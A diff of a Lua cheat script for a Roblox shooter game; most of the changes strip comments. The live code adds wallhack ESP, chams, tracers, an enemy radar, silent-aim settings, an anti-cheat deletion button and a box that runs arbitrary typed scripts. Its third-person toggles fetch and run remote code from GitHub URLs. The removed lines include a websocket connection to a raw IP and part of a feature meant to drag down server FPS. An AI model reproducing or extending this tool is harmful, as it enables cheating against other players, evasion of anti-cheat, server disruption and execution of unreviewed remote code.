             tracerPart.CanCollide = false
-            tracerPart.Transparency = 0.5  -- Set transparency
-            tracerPart.Material = Enum.Material.Neon  -- Use ForceField material to make it visible through walls
-            tracerPart.Color = Color3.fromRGB(255, 255, 255)  -- White color
+            tracerPart.Transparency = 0.5  
+            tracerPart.Material = Enum.Material.Neon  
+            tracerPart.Color = Color3.fromRGB(255, 255, 255)  
             tracerPart.Parent = workspace
 
-            -- Store the tracer part in the table
+            
             tracers[player] = tracerPart
 
-            -- Update the tracer's position and orientation every frame
+            
             local connection
             connection = game:GetService("RunService").Heartbeat:Connect(function()
                 if not tracers[player] or not player.Character or not player.Character:FindFirstChild("Head") then
-                    connection:Disconnect()  -- Stop updating if the tracer is disabled or player disappears
+                    connection:Disconnect()  
                     return
                 end
 
-                -- Get the player's Head position and look direction
+                
                 local headPosition = player.Character.Head.Position
                 local lookDirection = player.Character.Head.CFrame.LookVector
 
-                -- Set the position and orientation of the tracer part
+                
                 tracers[player].CFrame = CFrame.new(headPosition, headPosition + lookDirection) * CFrame.new(0, 0, -1)
             end)
         end
@@ -1888,14 +1875,14 @@ local function toggleTracersForAllPlayersExceptLocal(localPlayer)
     end
 end
 
--- Connect to PlayerAdded to allow new players to toggle tracers
+
 game.Players.PlayerAdded:Connect(function(player)
     player.CharacterAdded:Connect(function()
-        -- Delay the toggle to ensure the character is fully loaded
+        
         wait(1)
         local localPlayer = game.Players.LocalPlayer
         if player ~= localPlayer then
-            toggleTracer(player)  -- Automatically toggle tracer for new players, except local player
+            toggleTracer(player)  
         end
     end)
 end)
@@ -1904,16 +1891,16 @@ local localPlayer = players.LocalPlayer
 local workspace = game:GetService("Workspace")
 
 
--- Toggle variables
+
 local espEnabled = false
 local chamsEnabled = false
 local espObjects = {}
 local healthBillboards = {}
 
--- Custom distance factor (adjust for your game)
+
 local customFactor = 0.29
 
--- Function to create a 2D box for ESP
+
 local function create2DBox()
     local box = {}
     box.topLeft = Drawing.new("Line")
@@ -1922,7 +1909,7 @@ local function create2DBox()
     box.bottomRight = Drawing.new("Line")
 
     for _, line in pairs(box) do
-        line.Color = Color3.new(1, 1, 1) -- White color
+        line.Color = Color3.new(1, 1, 1) 
         line.Thickness = 1
         line.Transparency = 1
     end
@@ -1930,7 +1917,7 @@ local function create2DBox()
     return box
 end
 
--- Function to update 2D box positions
+
 local function update2DBox(box, character)
     local rootPart = character:FindFirstChild("HumanoidRootPart")
     if not rootPart then return end
@@ -1969,14 +1956,14 @@ local function update2DBox(box, character)
     end
 end
 
--- Function to remove 2D box
+
 local function remove2DBox(box)
     for _, line in pairs(box) do
         line:Remove()
     end
 end
 
--- Function to create or update ESP for a player
+
 local function createOrUpdateESP(player)
     local character = player.Character
     if not character or not character:FindFirstChild("HumanoidRootPart") then return end
@@ -2000,7 +1987,7 @@ local function createOrUpdateESP(player)
         nameHealthLabel.TextStrokeTransparency = 0.8
 
         local healthBar = Instance.new("Frame", billboard)
-        healthBar.BackgroundColor3 = Color3.new(0.121569, 0.945098, 0.011765) -- Green color
+        healthBar.BackgroundColor3 = Color3.new(0.121569, 0.945098, 0.011765) 
         healthBar.Size = UDim2.new(0, 20, 0, 50)
         healthBar.Position = UDim2.new(0, 210, 0, 0)
         healthBar.BorderSizePixel = 0
@@ -2045,7 +2032,7 @@ local function createOrUpdateESP(player)
     end
 end
 
--- Function to remove ESP for a player
+
 local function removeESP(player)
     if espObjects[player] then
         remove2DBox(espObjects[player].boxESP)
@@ -2056,7 +2043,7 @@ local function removeESP(player)
     end
 end
 
--- Function to check for nearby players
+
 local function checkNearbyPlayers()
     while espEnabled do
         local localCharacter = localPlayer.Character
@@ -2072,11 +2059,11 @@ local function checkNearbyPlayers()
                 end
             end
         end
-        wait(0.00001) -- Update every 0.1 seconds
+        wait(0.00001) 
     end
 end
 
--- Highlight functions (Chams)
+
 local function applyHighlight(player)
     local character = player.Character
     if character and character:FindFirstChild("HumanoidRootPart") then
@@ -2111,7 +2098,7 @@ local function toggleChams()
     end
 end
 
--- ESP toggle
+
 local function toggleESP()
     espEnabled = not espEnabled
     if espEnabled then
@@ -2123,20 +2110,20 @@ local function toggleESP()
     end
 end
 
--- Function to clean up stuck boxes
+
 local function cleanUpBoxes()
     while true do
-        wait(10) -- Wait for 10 seconds
+        wait(10) 
         for _, espData in pairs(espObjects) do
             if espData.boxESP then
                 remove2DBox(espData.boxESP)
-                espData.boxESP = create2DBox() -- Recreate the box to avoid being stuck
+                espData.boxESP = create2DBox() 
             end
         end
     end
 end
 
--- Start the box cleanup coroutine
+
 coroutine.wrap(cleanUpBoxes)()
 
 
@@ -2158,7 +2145,7 @@ end
 
 end
 
--- UI toggles
+
 EnemyEspTab:AddToggle('EspSwitch', {
     Text = 'Enable ESP',
     Default = false,
@@ -2169,9 +2156,9 @@ EnemyEspTab:AddToggle('EspSwitch', {
 })
 
 EnemyEspTab:AddLabel('Box Esp Color Picker'):AddColorPicker('Box Esp Color Picker', {
-    Default = Color3.fromRGB(255, 255, 255),  -- Use Color3 for the default color format
+    Default = Color3.fromRGB(255, 255, 255),  
     Title = 'Box Esp Color Picker',
-    Transparency = 0,                         -- Transparency setting (if supported)
+    Transparency = 0,                         
 
     Callback = function(Value)
 
@@ -2199,13 +2186,13 @@ EnemyEspTab:AddToggle('visiblecheck', {
 
 
 EnemyEspTab:AddLabel('Chams Esp Color Picker'):AddColorPicker('Chams Esp Color Picker', {
-    Default = Color3.fromRGB(255, 255, 255),  -- Use Color3 for the default color format
+    Default = Color3.fromRGB(255, 255, 255),  
     Title = 'Chams Esp Color Picker',
-    Transparency = 0,                         -- Transparency setting (if supported)
+    Transparency = 0,                         
 
     Callback = function(Value)
-        -- Set the box color to the selected color from the color picker
-        espLib.options.chamsFillColor = Value     -- `Value` should be a Color3 object
+        
+        espLib.options.chamsFillColor = Value     
     end
 })
 
@@ -2237,13 +2224,13 @@ EnemyEspTab:AddToggle('healthtext', {
 })
 
 EnemyEspTab:AddLabel('Health Esp Color Picker'):AddColorPicker('Health Esp Color Picker', {
-    Default = Color3.fromRGB(0, 255, 0),  -- Use Color3 for the default color format
+    Default = Color3.fromRGB(0, 255, 0),  
     Title = 'Health Esp Color Picker',
-    Transparency = 0,                         -- Transparency setting (if supported)
+    Transparency = 0,                         
 
     Callback = function(Value)
-        -- Set the box color to the selected color from the color picker
-        espLib.options.healthBarsColor = Value     -- `Value` should be a Color3 object
+        
+        espLib.options.healthBarsColor = Value     
     end
 })
 
@@ -2283,7 +2270,7 @@ EnemyEspTab:AddSlider('distancelimit', {
 
     Callback = function(Value)
         espLib.options.maxDistance = Value
-        -- Do not apply zoom immediately when the slider is adjusted
+        
     end
 })
 
@@ -2345,12 +2332,12 @@ end
 
 local function PlaceDot(plr)
     local PlayerDot = NewCircle(1, RadarInfo.PlayerDot, 3, true, 1)
-    PlayerDot.Visible = false  -- Initially hide the dot
+    PlayerDot.Visible = false  
 
     local function Update()
         local c
         c = RS.RenderStepped:Connect(function()
-            if RadarBackground.Visible then  -- Check if radar is visible
+            if RadarBackground.Visible then  
                 local char = plr.Character
                 if char and char:FindFirstChildOfClass("Humanoid") and char.PrimaryPart and char:FindFirstChildOfClass("Humanoid").Health > 0 then
                     local hum = char:FindFirstChildOfClass("Humanoid")
@@ -2407,7 +2394,7 @@ end
 
 local function NewLocalDot()
     local d = Drawing.new("Triangle")
-    d.Visible = false  -- Initially hide the dot
+    d.Visible = false  
     d.Thickness = 1
     d.Filled = true
     d.Color = RadarInfo.LocalPlayerDot
@@ -2427,7 +2414,7 @@ game.Players.PlayerAdded:Connect(function(v)
     LocalPlayerDot = NewLocalDot()
 end)
 
--- Function to update radar visibility
+
 local function UpdateRadarVisibility(visible)
     RadarBackground.Visible = visible
     RadarBorder.Visible = visible
@@ -2442,7 +2429,7 @@ local function UpdateRadarVisibility(visible)
     end
 end
 
--- Add the toggle to the EnemyEspTab
+
 if EnemyEspTab and EnemyEspTab.AddToggle then
     EnemyEspTab:AddToggle('minimap', {
         Text = 'Minimap',
@@ -2455,7 +2442,7 @@ else
     warn("EnemyEspTab or AddToggle method not found")
 end
 
--- Optional: Initialize the radar visibility based on the default toggle state
+
 if EnemyEspTab and EnemyEspTab.GetToggleState then
     local success, toggleState = pcall(function() return EnemyEspTab:GetToggleState('minimap') end)
     if success then
@@ -2467,7 +2454,7 @@ else
     warn("EnemyEspTab or GetToggleState method not found")
 end
 
--- Loop
+
 coroutine.wrap(function()
     local c
     c = RS.RenderStepped:Connect(function()
@@ -2487,7 +2474,7 @@ coroutine.wrap(function()
     end)
 end)()
 
--- Draggable
+
 local inset = game:service("GuiService"):GetGuiInset()
 
 local dragging = false
@@ -2526,14 +2513,14 @@ end)()
 
 
 
-local isESPEnabled = false -- Toggle state
+local isESPEnabled = false 
 
 local function DrawLine()
     local l = Drawing.new("Line")
     l.Visible = false
     l.From = Vector2.new(0, 0)
     l.To = Vector2.new(1, 1)
-    l.Color = Color3.fromRGB(255, 255, 255) -- White color
+    l.Color = Color3.fromRGB(255, 255, 255) 
     l.Thickness = 1
     l.Transparency = 1
     return l
@@ -2545,22 +2532,22 @@ local function DrawESP(plr)
     local R15 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) and true or false
     if R15 then 
         limbs = {
-            -- Spine
+            
             Head_UpperTorso = DrawLine(),
             UpperTorso_LowerTorso = DrawLine(),
-            -- Left Arm
+            
             UpperTorso_LeftUpperArm = DrawLine(),
             LeftUpperArm_LeftLowerArm = DrawLine(),
             LeftLowerArm_LeftHand = DrawLine(),
-            -- Right Arm
+            
             UpperTorso_RightUpperArm = DrawLine(),
             RightUpperArm_RightLowerArm = DrawLine(),
             RightLowerArm_RightHand = DrawLine(),
-            -- Left Leg
+            
             LowerTorso_LeftUpperLeg = DrawLine(),
             LeftUpperLeg_LeftLowerLeg = DrawLine(),
             LeftLowerLeg_LeftFoot = DrawLine(),
-            -- Right Leg
+            
             LowerTorso_RightUpperLeg = DrawLine(),
             RightUpperLeg_RightLowerLeg = DrawLine(),
             RightLowerLeg_RightFoot = DrawLine(),
@@ -2593,38 +2580,38 @@ local function DrawESP(plr)
                 if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
                     local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                     if vis then
-                        -- Head
+                        
                         local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
                         if limbs.Head_UpperTorso.From ~= Vector2.new(H.X, H.Y) then
-                            --Spine
+                            
                             local UT = Camera:WorldToViewportPoint(plr.Character.UpperTorso.Position)
                             local LT = Camera:WorldToViewportPoint(plr.Character.LowerTorso.Position)
-                            -- Left Arm
+                            
                             local LUA = Camera:WorldToViewportPoint(plr.Character.LeftUpperArm.Position)
                             local LLA = Camera:WorldToViewportPoint(plr.Character.LeftLowerArm.Position)
                             local LH = Camera:WorldToViewportPoint(plr.Character.LeftHand.Position)
-                            -- Right Arm
+                            
                             local RUA = Camera:WorldToViewportPoint(plr.Character.RightUpperArm.Position)
                             local RLA = Camera:WorldToViewportPoint(plr.Character.RightLowerArm.Position)
                             local RH = Camera:WorldToViewportPoint(plr.Character.RightHand.Position)
-                            -- Left leg
+                            
                             local LUL = Camera:WorldToViewportPoint(plr.Character.LeftUpperLeg.Position)
                             local LLL = Camera:WorldToViewportPoint(plr.Character.LeftLowerLeg.Position)
                             local LF = Camera:WorldToViewportPoint(plr.Character.LeftFoot.Position)
-                            -- Right leg
+                            
                             local RUL = Camera:WorldToViewportPoint(plr.Character.RightUpperLeg.Position)
                             local RLL = Camera:WorldToViewportPoint(plr.Character.RightLowerLeg.Position)
                             local RF = Camera:WorldToViewportPoint(plr.Character.RightFoot.Position)
 
-                            --Head
+                            
                             limbs.Head_UpperTorso.From = Vector2.new(H.X, H.Y)
                             limbs.Head_UpperTorso.To = Vector2.new(UT.X, UT.Y)
 
-                            --Spine
+                            
                             limbs.UpperTorso_LowerTorso.From = Vector2.new(UT.X, UT.Y)
                             limbs.UpperTorso_LowerTorso.To = Vector2.new(LT.X, LT.Y)
 
-                            -- Left Arm
+                            
                             limbs.UpperTorso_LeftUpperArm.From = Vector2.new(UT.X, UT.Y)
                             limbs.UpperTorso_LeftUpperArm.To = Vector2.new(LUA.X, LUA.Y)
 
@@ -2634,7 +2621,7 @@ local function DrawESP(plr)
                             limbs.LeftLowerArm_LeftHand.From = Vector2.new(LLA.X, LLA.Y)
                             limbs.LeftLowerArm_LeftHand.To = Vector2.new(LH.X, LH.Y)
 
-                            -- Right Arm
+                            
                             limbs.UpperTorso_RightUpperArm.From = Vector2.new(UT.X, UT.Y)
                             limbs.UpperTorso_RightUpperArm.To = Vector2.new(RUA.X, RUA.Y)
 
@@ -2644,7 +2631,7 @@ local function DrawESP(plr)
                             limbs.RightLowerArm_RightHand.From = Vector2.new(RLA.X, RLA.Y)
                             limbs.RightLowerArm_RightHand.To = Vector2.new(RH.X, RH.Y)
 
-                            -- Left Leg
+                            
                             limbs.LowerTorso_LeftUpperLeg.From = Vector2.new(LT.X, LT.Y)
                             limbs.LowerTorso_LeftUpperLeg.To = Vector2.new(LUL.X, LUL.Y)
 
@@ -2654,7 +2641,7 @@ local function DrawESP(plr)
                             limbs.LeftLowerLeg_LeftFoot.From = Vector2.new(LLL.X, LLL.Y)
                             limbs.LeftLowerLeg_LeftFoot.To = Vector2.new(LF.X, LF.Y)
 
-                            -- Right Leg
+                            
                             limbs.LowerTorso_RightUpperLeg.From = Vector2.new(LT.X, LT.Y)
                             limbs.LowerTorso_RightUpperLeg.To = Vector2.new(RUL.X, RUL.Y)
 
@@ -2725,15 +2712,15 @@ local function DrawESP(plr)
                             local RLL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, -RL_Height, 0)).p)
                             local RF = Camera:WorldToViewportPoint(plr.Character["Right Leg"].Position)
 
-                            --Head
+                            
                             limbs.Head_Spine.From = Vector2.new(H.X, H.Y)
                             limbs.Head_Spine.To = Vector2.new(UT.X, UT.Y)
 
-                            --Spine
+                            
                             limbs.Spine.From = Vector2.new(UT.X, UT.Y)
                             limbs.Spine.To = Vector2.new(LT.X, LT.Y)
 
-                            -- Left Arm
+                            
                             limbs.LeftArm.From = Vector2.new(UT.X, UT.Y)
                             limbs.LeftArm.To = Vector2.new(LUA.X, LUA.Y)
 
@@ -2742,7 +2729,7 @@ local function DrawESP(plr)
 
                             limbs.LeftArm_UpperTorso.To = Vector2.new(LH.X, LH.Y)
 
-                            -- Right Arm
+                            
                             limbs.RightArm.From = Vector2.new(UT.X, UT.Y)
                             limbs.RightArm.To = Vector2.new(RUA.X, RUA.Y)
 
@@ -2751,7 +2738,7 @@ local function DrawESP(plr)
 
                             limbs.RightArm_UpperTorso.To = Vector2.new(RH.X, RH.Y)
 
-                            -- Left Leg
+                            
                             limbs.LeftLeg.From = Vector2.new(LT.X, LT.Y)
                             limbs.LeftLeg.To = Vector2.new(LUL.X, LUL.Y)
 
@@ -2760,7 +2747,7 @@ local function DrawESP(plr)
 
                             limbs.LeftLeg_LowerTorso.To = Vector2.new(LF.X, LF.Y)
 
-                            -- Right Leg
+                            
                             limbs.RightLeg.From = Vector2.new(LT.X, LT.Y)
                             limbs.RightLeg.To = Vector2.new(RUL.X, RUL.Y)
 
@@ -2804,7 +2791,7 @@ local function DrawESP(plr)
     end
 end
 
--- Toggle ESP
+
 local function ToggleESP()
     isESPEnabled = not isESPEnabled
     if isESPEnabled then
@@ -2862,7 +2849,7 @@ counter = counter + 1
 local WorldTab = Visuals:AddTab('world')
 local Misc = Tabs.Misc:AddLeftGroupbox('misc1')
 local movetab = Tabs.Misc:AddRightGroupbox('misc2')
---local Settings = Tabs.Settings:AddLeftGroupbox('Settings')
+
 local luatab = Tabs.Lua:AddRightGroupbox('dogelua');
 do
     local Sky = game:GetService("Lighting"):FindFirstChildOfClass("Sky")
@@ -2876,7 +2863,7 @@ do
         ["Deep Space"] = { ["SkyboxBk"] = "rbxassetid://159248188", ["SkyboxDn"] = "rbxassetid://159248183", ["SkyboxFt"] = "rbxassetid://159248187", ["SkyboxLf"] = "rbxassetid://159248173", ["SkyboxRt"] = "rbxassetid://159248192", ["SkyboxUp"] = "rbxassetid://159248176" },
         ["Winter"] = { ["SkyboxBk"] = "rbxassetid://510645155", ["SkyboxDn"] = "rbxassetid://510645130", ["SkyboxFt"] = "rbxassetid://510645179", ["SkyboxLf"] = "rbxassetid://510645117", ["SkyboxRt"] = "rbxassetid://510645146", ["SkyboxUp"] = "rbxassetid://510645195" },
         ["Clouded Sky"] = { ["SkyboxBk"] = "rbxassetid://252760981", ["SkyboxDn"] = "rbxassetid://252763035", ["SkyboxFt"] = "rbxassetid://252761439", ["SkyboxLf"] = "rbxassetid://252760980", ["SkyboxRt"] = "rbxassetid://252760986", ["SkyboxUp"] = "rbxassetid://252762652" },
-        --["test"] = {"SkyboxBk"="rbxassetid://","SkyboxDn"="rbxassetid://","SkyboxFt"="rbxassetid://","SkyboxLf"="rbxassetid://","SkyboxRt"="rbxassetid://","SkyboxUp"="rbxassetid://"},
+        
     }
 
 
@@ -2966,9 +2953,9 @@ corpseesplib3.updateInterval = Value
     end
 })
 
--- New code for Ambient Color Picker
+
 WorldTab:AddLabel('Corpse Color'):AddColorPicker('Corpse Color', {
-    Default = Color3.new(1, 0, 0), -- Default to the current ambient color
+    Default = Color3.new(1, 0, 0), 
     Title = 'Corpse Color',
     Transparency = 0,
 
@@ -2978,7 +2965,7 @@ WorldTab:AddLabel('Corpse Color'):AddColorPicker('Corpse Color', {
 })
 
 WorldTab:AddLabel('Distance Color'):AddColorPicker('Distance Color', {
-    Default = Color3.new(1, 1, 1), -- Default to the current ambient color
+    Default = Color3.new(1, 1, 1), 
     Title = 'Distance Color',
     Transparency = 0,
 
@@ -2988,7 +2975,7 @@ WorldTab:AddLabel('Distance Color'):AddColorPicker('Distance Color', {
 })
 
 WorldTab:AddLabel('Corpse Color'):AddColorPicker('Corpse Color', {
-    Default = Color3.new(1, 0, 0), -- Default to the current ambient color
+    Default = Color3.new(1, 0, 0), 
     Title = 'Corpse Color',
     Transparency = 0,
 
@@ -2998,7 +2985,7 @@ WorldTab:AddLabel('Corpse Color'):AddColorPicker('Corpse Color', {
 })
 
 WorldTab:AddLabel('Bracket Color'):AddColorPicker('Bracket Color', {
-    Default = Color3.new(1, 0, 0), -- Default to the current ambient color
+    Default = Color3.new(1, 0, 0), 
     Title = 'Bracket Color',
     Transparency = 0,
 
@@ -3007,94 +2994,37 @@ WorldTab:AddLabel('Bracket Color'):AddColorPicker('Bracket Color', {
     end
 })
 
---7133
-WorldTab:AddToggle('cartpfurther', { Text = 'teleport most far car', Default = false })
-WorldTab:AddButton("Car Teleport", function()
-    if not plr.Character then return Library:Notify("no character") end
-    local uaz, dist = nil, Toggles["cartpfurther"].Value and 0 or math.huge
-    do
-        for i, v in pairs(workspace:WaitForChild("Vehicles"):GetChildren()) do
-            if v:FindFirstChild("Body") and v.Body:FindFirstChildOfClass("MeshPart") and
-                (Toggles["cartpfurther"].Value and dist < (v.Body:FindFirstChildOfClass("MeshPart").Position - workspace.CurrentCamera.CFrame.p).Magnitude or
-                    dist > (v.Body:FindFirstChildOfClass("MeshPart").Position - workspace.CurrentCamera.CFrame.p).Magnitude)
-            then
-                dist = (v.Body:FindFirstChildOfClass("MeshPart").Position - workspace.CurrentCamera.CFrame.p).Magnitude
-                uaz = v
-            end
-        end
-    end
-
-    if not uaz then return Library:Notify("there is no cars around") end
-    local player = game.Players.LocalPlayer
-
-    for i, v in next, uaz:GetDescendants() do
-        if v:IsA('Seat') and v.Name == 'SeatFR' then
-            v:Sit(player.Character.Humanoid)
-        end
-    end
-
-    wait(0.2)
-
-    game:GetService("ReplicatedStorage").Remotes.VehicleInteractions:FireServer({
-        ["Vehicle"] = uaz,
-        ["Action"] = "Enter",
-        ["Door"] = uaz.Body.FRdoor.FR_Door
-    })
-    wait(.2)
-
-    uaz.Remotes.ExitSeat:FireServer()
-    wait(0.1)
-    --[[game:GetService("ReplicatedStorage").Remotes.VehicleInteractions:FireServer({
-        ["Vehicle"] = uaz,
-        ["Action"] = "Exit",
-        ["Door"] = uaz.Body.FRdoor.FR_Door
-    })
-    game:GetService("ReplicatedStorage").Remotes.VehicleInteractions:FireServer({
-        ["Vehicle"] = uaz,
-        ["Action"] = "Enter",
-        ["Door"] = uaz.Body.FRdoor.FR_Door
-    })
-    game:GetService("ReplicatedStorage").Remotes.VehicleInteractions:FireServer({
-        ["Vehicle"] = uaz,
-        ["Action"] = "Exit",
-        ["Door"] = uaz.Body.FRdoor.FR_Door
-    })]]
-    uaz.Remotes.ExitSeat:FireServer()
-    wait(1)
-    --player.Character:FindFirstChildOfClass('Humanoid'):Move(Vector3.new(0, 10, 0))
-end)
 
 
- 
 
 
--- Call the function to apply ForceField and remove SurfaceAppearance
+
 
 
 
 makefolder("nexify661")
 luatab:AddInput('Execute', {
     Default = 'Execute Any Scripts',
-    Numeric = false, -- true / false, only allows numbers
-    Finished = true, -- Call the callback only when you press Enter
+    Numeric = false, 
+    Finished = true, 
 
     Text = 'Execute Script',
-    Tooltip = 'Execute Any Scripts', -- Information shown when you hover over the textbox
+    Tooltip = 'Execute Any Scripts', 
 
-    Placeholder = 'Execute Any Scripts', -- Placeholder text when the box is empty
-    -- MaxLength is also an option which is the max length of the text
+    Placeholder = 'Execute Any Scripts', 
+    
 
     Callback = function(Value)
-        -- Ensure the script is safe to execute, if necessary
+        
         if Value and Value ~= "" then
-            print('[cb] Executing script:', Value) -- Debug print
+            print('[cb] Executing script:', Value) 
             local success, err = pcall(function()
-                loadstring(Value)() -- Execute the script input by the user
+                loadstring(Value)() 
             end)
 
-            -- Handle execution result
+            
             if not success then
-                print('[cb] Error executing script:', err) -- Print any errors encountered
+                print('[cb] Error executing script:', err) 
             end
         else
             print('[cb] No script provided.')
@@ -3109,28 +3039,23 @@ luatab:AddLabel("1.2")
 
 print('load_' .. tostring(counter))
 counter = counter + 1
---[[WorldTab:AddToggle('nograsss', {
-    Text = 'no grass',
-    Default = false,
-    Callback = function(first)
-        sethiddenproperty(game:GetService("Workspace").Terrain, "Decoration", not first)
-    end
-})]]
+
+
 
 local UserInputService = game:GetService("UserInputService")
 
 
-local zoomValue = 0 -- Default zoom value
-local defaultFOV = Camera.FieldOfView -- Get the current FOV from the camera
-local zoomKey = Enum.KeyCode.Z -- Default keybind
+local zoomValue = 0 
+local defaultFOV = Camera.FieldOfView 
+local zoomKey = Enum.KeyCode.Z 
 
--- Function to apply zoom based on zoom value
+
 local function applyZoom()
-    Camera.FieldOfView = defaultFOV - (zoomValue * 10) -- Adjust FOV based on zoom value
+    Camera.FieldOfView = defaultFOV - (zoomValue * 10) 
 end
 
 
--- Slider for Zoom Value
+
 Misc:AddSlider('ZoomSlider', {
     Text = 'Zoom Value',
     Default = 0,
@@ -3141,11 +3066,11 @@ Misc:AddSlider('ZoomSlider', {
 
     Callback = function(Value)
         zoomValue = Value
-        -- Do not apply zoom immediately when the slider is adjusted
+        
     end
 })
 
--- Keybind for Zoom
+
 Misc:AddLabel('Zoom Bind'):AddKeyPicker('ZoomKeyPicker', {
     Default = 'Z',
     SyncToggleState = false,
@@ -3157,37 +3082,37 @@ Misc:AddLabel('Zoom Bind'):AddKeyPicker('ZoomKeyPicker', {
     end,
 
     ChangedCallback = function(newKey)
-        zoomKey = newKey -- Update the zoom key when a new key is selected
+        zoomKey = newKey 
         print('[cb] Keybind changed!', newKey)
     end
 })
 
--- Variable to track zoom state
+
 local isZoomed = false
 
--- Function to handle input for zooming
-local function onKeyPress(input, gameProcessed)
-    if gameProcessed then return end -- Prevent if the input is processed by the game
 
-    -- Check if the input is the zoom key
+local function onKeyPress(input, gameProcessed)
+    if gameProcessed then return end 
+
+    
     if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == zoomKey then
-        isZoomed = not isZoomed -- Toggle zoom state
+        isZoomed = not isZoomed 
         if isZoomed then
-            applyZoom() -- Apply zoom when enabled
+            applyZoom() 
         else
-            Camera.FieldOfView = defaultFOV -- Reset to default FOV when disabled
+            Camera.FieldOfView = defaultFOV 
         end
     end
 end
 
--- Connect the key press event
+
 UserInputService.InputBegan:Connect(onKeyPress)
 
--- Ensure zoom is applied only when the zoom key is pressed
+
 UserInputService.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == zoomKey then
         if isZoomed then
-            applyZoom() -- Reapply zoom if the key is currently held down
+            applyZoom() 
         end
     end
 end)
@@ -3204,7 +3129,7 @@ counter = counter + 1
 
 WorldTab:AddButton('Delete Solters Anti Cheat', function()
 
---removed
+
 
 		
  end)
@@ -3226,54 +3151,56 @@ Misc:AddToggle('Refresh Silent Aim', {
     Risky = true,
     Callback = function(isEnabled)
         
---lol
+
 
     end
 })
 
+
+Misc:AddSlider('Silentdsfwesgerdsf', {
+    Text = 'Silent Aim Refresh Module Refresh Rate',
+    Default = 4, 
+    Min = 0.2, 
+    Max = 15, 
+    Rounding = 2, 
+    Compact = false,
+}):OnChanged(function(value)
+
+
+
+end)
+
 Misc:AddButton('Rejoin⚡', function()
     if #plrs:GetPlayers() <= 1 then
         plrs.LocalPlayer:Kick("\nrejoining⚡")
-        wait()
+        wait(3)
         game:GetService("TeleportService"):Teleport(game.PlaceId, plrs.LocalPlayer)
     else
+    plrs.LocalPlayer:Kick("\nrejoining⚡")
+    wait(3)
         game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plrs.LocalPlayer)
     end
 end)
---[[do
-    local socket
-    local rand = game:service("HttpService"):GenerateGUID(false):sub(1,5)
-    if not ( websocket and websocket.connect and pcall(function()socket = websocket.connect("ws://31.210.171.229:8080")end) ) then
-        return print("chat failed\nsupported: "..(websocket and websocket.connect and "✅\n" or "❌\n").."connected: ❌")
-    else
-        socket.OnMessage:Connect(function(txt)
-            print(txt)
-        end)
-        Misc:AddInput('chatboxtest', {Default = 'hello there',Numeric = false,Finished = false,Text = 'chat',Tooltip = 'chat',Placeholder = 'enter text'})
-        Misc:AddButton('send message in swimhub chat', function()
-            socket:Send("swimhub_"..rand..":-/-:"..tostring(Options.chatboxtest.Value))
-        end)
-    end
-end;]]
 
--- Toggle function to enable or disable third-person mode
+
+
 local function toggleThirdPerson(enable)
     if enable then
-        -- Enable third-person view
+        
         player.CameraMode = Enum.CameraMode.Classic
         player.CameraMaxZoomDistance = 10
         player.CameraMinZoomDistance = 10
         camera.CameraType = Enum.CameraType.Custom
         camera.CameraSubject = player.Character:FindFirstChild("Humanoid")
     else
-        -- Disable third-person view
+        
         player.CameraMode = Enum.CameraMode.LockFirstPerson
         camera.CameraType = Enum.CameraType.Custom
-        camera.CameraSubject = nil  -- No specific subject in first-person
+        camera.CameraSubject = nil  
     end
 end
 
--- Add toggle to the UI
+
 movetab:AddToggle('Third Person', {
     Text = 'Third Person',
     Default = false,
@@ -3281,11 +3208,11 @@ movetab:AddToggle('Third Person', {
     Callback = function(isEnabled)
         if isEnabled then
             print("called")
-            -- Load the script when Third Person is enabled
+            
             loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/thirdpe.lua"))()
         else
         print("called2")
-            -- Load the script when Third Person is disabled
+            
             loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/thirdsianle.lua"))()
         end
     end
@@ -3309,22 +3236,22 @@ movetab:AddToggle('Server Info', {
     Text = 'Server Info',
     Default = true,
     Callback = function(value)
-        local player = game.Players.LocalPlayer -- Correct way to get the local player
-        if player and player:FindFirstChild("PlayerGui") then -- Ensure PlayerGui exists
-            local serverInfo = player.PlayerGui:FindFirstChild("ServerInfo") -- Safely find ServerInfo
+        local player = game.Players.LocalPlayer 
+        if player and player:FindFirstChild("PlayerGui") then 
+            local serverInfo = player.PlayerGui:FindFirstChild("ServerInfo") 
             if serverInfo then
-                serverInfo.Enabled = value -- Toggle the visibility
+                serverInfo.Enabled = value 
             else
-                warn("ServerInfo GUI not found in PlayerGui") -- Debug warning
+                warn("ServerInfo GUI not found in PlayerGui") 
             end
         else
-            warn("PlayerGui not found for LocalPlayer") -- Debug warning
+            warn("PlayerGui not found for LocalPlayer") 
         end
     end
 })
 
 
--- UI toggles
+
 movetab:AddToggle('Menu Blur', {
     Text = 'Menu Blur',
     Default = true,
@@ -3347,7 +3274,7 @@ counter = counter + 1
 
 print('load_' .. tostring(counter))
 counter = counter + 1
--- totally not cripware
+
 
 
 print('load_' .. tostring(counter))
@@ -3360,85 +3287,8 @@ local aimtab = pdeltatabbox:AddTab("Combat Features")
 
 print('suckerloaders_' .. tostring(counter))
 counter = counter + 4
---[[
-aimtab:AddToggle('FUCKPDDDD', {
-    Text = "FUCK UP THE SERVER FPS",
-    Default = false,
-})
-aimtab:AddLabel("@w._.ruby._.w gave me it ^w^!! thx!!")
-aimtab:AddSlider('FUCKPDD!!!!', {
-    Text = 'TABLE INCR',
-    Default = 250,
-    Min = 1,
-    Max = 300,
-    Rounding = 0,
-    Compact = false,
-})
-aimtab:AddSlider('FUCKPDD!!!!!!', {
-    Text = 'TRIES',
-    Default = 2,
-    Min = 1,
-    Max = 5,
-    Rounding = 0,
-    Compact = false,
-})
-aimtab:AddSlider('FUCKPDD!!!!!!!!', {
-    Text = 'DELAY',
-    Default = 0.6,
-    Min = 0.1,
-    Max = 1,
-    Rounding = 2,
-    Compact = false,
-})
-wrap(function()
-    local function rahhh()
-        local function getmaxvalue(val)
-            local mainvalueifonetable = 499999
-            if type(val) ~= "number" then
-                return nil
